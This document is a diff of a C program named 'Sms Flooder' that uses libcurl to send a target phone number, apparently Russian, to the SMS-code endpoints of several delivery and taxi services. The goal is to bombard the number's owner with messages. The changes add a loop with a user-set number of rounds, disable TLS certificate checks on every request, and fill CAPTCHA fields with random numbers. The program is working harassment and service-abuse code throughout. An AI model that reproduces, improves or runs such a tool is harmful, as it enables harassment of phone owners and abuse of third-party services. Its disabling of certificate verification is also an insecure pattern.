@@ -1,9 +1,10 @@
-/*  Sms Flooder v1.2
+/*  Sms Flooder v1.3 
+ *  Windows basic template
  *  gcc sms-flooder.c -lcurl
  *  ./sms-flooder
 */
 
-#include <stdio.h>      //
+#include <stdio.h>      // printf();
 #include <stdlib.h>     // rend();
 #include <curl/curl.h>  // for curl;
 #include <unistd.h>     // sleep();
@@ -38,8 +39,11 @@ void SmsDelevery(char* phone) {
 
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
         curl_easy_setopt(curl, CURLOPT_COOKIE, "mr1lad=undefined; mr1luid=undefined; mr1lext=undefined");
-        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./delivery-cookie.txt");
+        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "delivery-cookie.txt");
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "");
+        
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
     
         /* Perform the request, res will get the return code */
         res = curl_easy_perform(curl);
@@ -56,7 +60,10 @@ void SmsDelevery(char* phone) {
         chunk = curl_slist_append(chunk, "Content-Type: multipart/form-data; boundary=---------------------------18803091494160019601289726221");
 
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
-        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./delivery-cookie.txt");
+        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "delivery-cookie.txt");
+
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
         
         /* Buffer for POST data with phone number*/
         sprintf(Buf, "-----------------------------18803091494160019601289726221\nContent-Disposition: form-data; name=\"phone\"\n\n%s\n-----------------------------18803091494160019601289726221--\n", phone);
@@ -89,7 +96,10 @@ void GetCookieDostaevsky() {
         chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
         chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
-        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./dostaevsky-cookie.txt");
+        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "dostaevsky-cookie.txt");
+
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
 
         res = curl_easy_perform(curl);
         if(res != CURLE_OK)
@@ -109,7 +119,7 @@ void SmsDostaevsky(char* phone) {
 
     /* Get token to post data from cookie-file*/
     FILE *file;
-    file = fopen("./dostaevsky-cookie.txt", "r");
+    file = fopen("dostaevsky-cookie.txt", "r");
 
     while (fscanf (file, "%s", token) != EOF) {
         if (f==1) break;
@@ -129,7 +139,10 @@ void SmsDostaevsky(char* phone) {
         chunk = curl_slist_append(chunk, "Content-type: application/x-www-form-urlencoded; charset=UTF-8");
 
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
-        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./dostaevsky-cookie.txt");
+        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "dostaevsky-cookie.txt");
+
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
 
         /* Buffer for POST data with phone number*/
         sprintf(Buf, "phone=+%c %c%c%c %c%c%c-%c%c-%c%c&_token=%s", phone[0], phone[1], phone[2], phone[3], phone[4], phone[5], phone[6], phone[7], phone[8], phone[9], phone[10], token);
@@ -165,6 +178,9 @@ void SmsOllis(char* phone) {
 
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
 
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
+
         sprintf(Buf, "{\"query\":\"mutation { phone(number:\\\"%s\\\", locale:ru) { token error { code message } } }\"}", phone);
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);
 
@@ -197,6 +213,10 @@ void SmsMfood(char* phone) {
         // What is x-keypass?
         chunk = curl_slist_append(chunk, "x-keypass: lebfgiuDaeEYiou2%3255$208@{wdw{]}");
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
+
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
+
         // How to work recaptchaToken?
         sprintf(Buf, "{\"departmentId\":3,\"regionId\":2,\"phone\":\"%s\",\"recaptchaToken\":\"%d\"}", phone, GetRandInt(500, 10000));
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);
@@ -225,7 +245,10 @@ void GetCookieTaxovichkof() {
         chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
         chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
-        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./taxovichkof-cookie.txt");
+        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "taxovichkof-cookie.txt");
+
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
 
         res = curl_easy_perform(curl);
         if(res != CURLE_OK)
@@ -252,7 +275,10 @@ void SmsTaxovichkof(char* phone) {
         chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded; charset=UTF-8");
 
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
-        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./taxovichkof-cookie.txt");
+        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "taxovichkof-cookie.txt");
+
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
 
         sprintf(Buf, "Users%%5Busername%%5D=%%2B%c+(%c%c%c)+%c%c%c-%c%c%c%c&Users%%5Bpassword%%5D=", phone[0], phone[1], phone[2], phone[3], phone[4], phone[5], phone[6], phone[7], phone[8], phone[9], phone[10]);
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);
@@ -281,7 +307,10 @@ void GetCookieDvepalochki() {
         chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
         chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
-        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./dvepalochki-cookie.txt");
+        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "dvepalochki-cookie.txt");
+
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
 
         res = curl_easy_perform(curl);
         if(res != CURLE_OK)
@@ -308,7 +337,10 @@ void SmsDvepalochki(char* phone) {
         chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded; charset=UTF-8");
 
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
-        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./dvepalochki-cookie.txt");
+        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "dvepalochki-cookie.txt");
+
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
 
         sprintf(Buf, "ajaxSendSMS=Y&phone=%%2B%c+(%c%c%c)+%c%c%c-%c%c-%c%c", phone[0], phone[1], phone[2], phone[3], phone[4], phone[5], phone[6], phone[7], phone[8], phone[9], phone[10]);
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);
@@ -337,7 +369,10 @@ void GetCookieEvrasia() {
         chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
         chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
-        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./evrasia-cookie.txt");
+        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "evrasia-cookie.txt");
+
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
 
         res = curl_easy_perform(curl);
         if(res != CURLE_OK)
@@ -364,7 +399,10 @@ void SmsEvrasia(char* phone) {
         chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");
 
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
-        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./evrasia-cookie.txt");
+        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "evrasia-cookie.txt");
+
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
 
         sprintf(Buf, "name=Sam&username=%%2B%c+%%28%c%c%c%%29+%c%c%c-%c%c-%c%c&mail=Q%dSW%%40gmail.com&bday=05%%2F11%%2F1998&dispatch1=sms&PERSONAL_GENDER=M&pers_data=yes", phone[0], phone[1], phone[2], phone[3], phone[4], phone[5], phone[6], phone[7], phone[8], phone[9], phone[10], GetRandInt(1, 1437));
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);
@@ -382,33 +420,45 @@ void SmsEvrasia(char* phone) {
 int main(void)
 {
     char phone[16];
+    int rounds;
 
     // Print Banner
-    printf("\n\t------------------------\n\t|  Sms Flooder v1.2    |\n\t|----------------------|\n");
-    printf("\t| Developed by mrTavas |\n\t------------------------\n");
-    printf("\n[?] Number format: 71231231212\n");
+    printf("\n\t\t------------------------\n\t\t|  Sms Flooder v1.3    |\n\t\t|----------------------|\n");
+    printf("\t\t| Developed by mrTavas |\n\t\t------------------------\n");
+    printf("\n[?] Number example: 71231231212\n");
+    printf("[?] Rounds example: 1\n");
     printf("\n[*] Started...\n[?] Phone to attck -> ");
     scanf("%s", phone);
-    
+    printf("[?] Rounds -> ");
+    scanf("%d", &rounds);
+    if (rounds == 0) return 0;
+
     /* Get cookies */
     GetCookieDostaevsky();
     GetCookieTaxovichkof();
     GetCookieDvepalochki();
     GetCookieEvrasia();
+    system("cls");
 
-    /* Flood */
-    SmsDelevery(phone);
-    SmsDostaevsky(phone);
-    SmsOllis(phone);
-    SmsMfood(phone);
-    SmsTaxovichkof(phone); // (!5 min timer)
-    SmsDvepalochki(phone);
-    SmsEvrasia(phone);     // (!one sms only)
+    /* Starting Flood */
+    for (int i = 1; i <= rounds; i++) {
 
+        SmsDelevery(phone);
+        SmsDostaevsky(phone);
+        SmsOllis(phone);
+        SmsMfood(phone);
+        SmsTaxovichkof(phone); // (!5 min timer)
+        SmsDvepalochki(phone);
+        SmsEvrasia(phone);     // (!one sms only)
 
+        system("cls");
+        printf("[+] Round %d done\n", i);
+        sleep(10);
+    }
+    
+    printf("[+] %d Rounds done. Have a nice day!\n[*] Closing...\n", rounds);
 
-    // system("clear");
-    printf("\n[+] Done\n");
+    sleep(5);
     return 0;
 }
 
